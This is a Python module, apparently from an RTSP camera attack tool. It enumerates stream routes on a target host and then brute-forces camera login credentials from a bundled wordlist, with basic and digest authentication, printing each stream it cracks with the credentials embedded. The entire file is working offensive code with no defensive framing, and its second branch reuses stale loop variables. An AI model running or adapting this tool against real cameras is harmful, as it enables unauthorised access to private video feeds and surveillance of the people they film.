import socket, os, json
from . import attack_routes as ar
from . import auth_helper as ah
from colorama import init
from termcolor import colored
from urllib.parse import urljoin, urlparse
from . import getauthenticationmethod as getAUTH
#urljoin(url, urlparse(url).path)

init()

def attack_creds_after_routes(target, port, authmethod, urlList):
    seq = 1
    successNum = 0
    with open(os.path.join(os.path.dirname(__file__), 'resources\\creds.json'), 'r') as f:
        userpasslist = json.load(f)

#describeURL = urljoin(url, urlparse(url).path)
    foundUsername = ""
    foundPassword = ""

    for url in urlList:
        if foundUsername == "" and foundPassword == "":
            for username in userpasslist['usernames']:
                for password in userpasslist['passwords']:
                    try:
                        describeURL = url
                        describeURL = describeURL.replace("invalidusername", username).replace("invalidpassword", password)
                        # print(describeURL)
                        # connect in loop, to avoid socket disconnections
                        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        s.settimeout(10)
                        s.connect((target,port))

                        if authmethod == "digest":
                            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                            received = s.recv(ah.configJson["bufLen"]).decode()
                            # print(receivedBuffer)
                            seq += 1
                        else:
                            received = ""

                        s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, received, username, password)))
                        receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
                        seq += 1
                        if "RTSP/1.0 200" in receivedBuffer:
                            foundUsername = username
                            foundPassword = password
                            successNum += 1
                            print(colored("[+] Found Stream: {}".format(url.replace("rtsp://", "rtsp://{}:{}@".format(username, password))), 'green'))
                    except:
                        pass
                    if foundUsername != "" and foundPassword != "":
                        break
                if foundUsername != "" and foundPassword != "":
                    break
        else:
            try:
                describeURL = url
                describeURL = describeURL.replace("invalidusername", foundUsername).replace("invalidpassword", foundPassword)
                print(describeURL)
                # connect in loop, to avoid socket disconnections
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((target,port))


                if authmethod == "digest":
                    s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                    received = s.recv(ah.configJson["bufLen"]).decode()
                    # print(receivedBuffer)
                    seq += 1
                else:
                    received = ""

                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, received, username, password)))
                receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
                seq += 1
                if "RTSP/1.0 200" in receivedBuffer:
                    successNum += 1
                    print(colored("[+] Found Stream: {}".format(url.replace("rtsp://", "rtsp://{}:{}@".format(username, password))), 'green'))
            except:
                pass
    if successNum > 0:
        print(colored("-" * 40, 'cyan'))

def findValidRoutes(target, port):
    seq = 1
    authmethod = ""
    foundStreams = []

    for route in ar.routeBuilder("invalidusername", "invalidpassword"):
        try:
            # connect in loop, to avoid socket disconnections
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target,port))

            describeURL = "rtsp://{}:{}/{}".format(target, port, route)

            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
            receivedBuffer = s.recv(ah.configJson["bufLen"]).decode()
            seq += 1
            if "RTSP/1.0 401" in receivedBuffer or "RTSP/1.0 403" in receivedBuffer:
                if authmethod == "": # Detect AUTH method, at the first found route
                    authmethod = getAUTH.detect_auth(target, port)
                if describeURL not in foundStreams:
                    foundStreams.append(describeURL)
                    # print(colored("[+] Found stream {}".format(describeURL), 'cyan'))
        except:
            pass
    attack_creds_after_routes(target, port, authmethod, foundStreams)
